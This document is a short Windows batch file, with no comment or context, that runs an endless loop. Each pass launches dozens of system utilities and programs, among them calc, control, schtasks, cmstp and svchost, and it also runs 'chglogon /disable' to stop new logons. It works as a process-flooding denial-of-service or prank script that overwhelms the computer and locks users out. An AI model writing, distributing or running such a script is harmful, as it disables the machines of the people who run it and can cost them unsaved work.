@echo off
:loop
start TieringEngineService&start winver&start wininit&start regini&start ntoskrnl&start newdev&start prevhost&start audiodg&start svchost&start powercfg&start reg&start msinfo32&start bootim
start SystemUWPLauncher&start UserAccountControlSettings&start devmgmt&start SlideToShutdown&chglogon /disable&start control&start rasphone&start rasdial&start raserver&start dialer
start Robocopy&start calc&start cleanmgr&start cmdkey&start charmap&start PresentationHost&start sudo&start rdrleakdiag&start recover&start schtasks
start cmstp&start colorcpl&start cipher&start Defrag&start tasklist&start dvdplay&start DFDWiz&start DevModeRunAsUserConfig&start WF.msc&start wextract&start wiaacmgr
start DisplaySwitch&start djoin&start dmclient&start SpatialAudioLicenseSrv&start srdelayed&start systeminfo&start wscript&start WWAHost&start wecutil&start systray
start subst&start fontview&start HOSTNAME&start COMPUTE
goto loop /t 0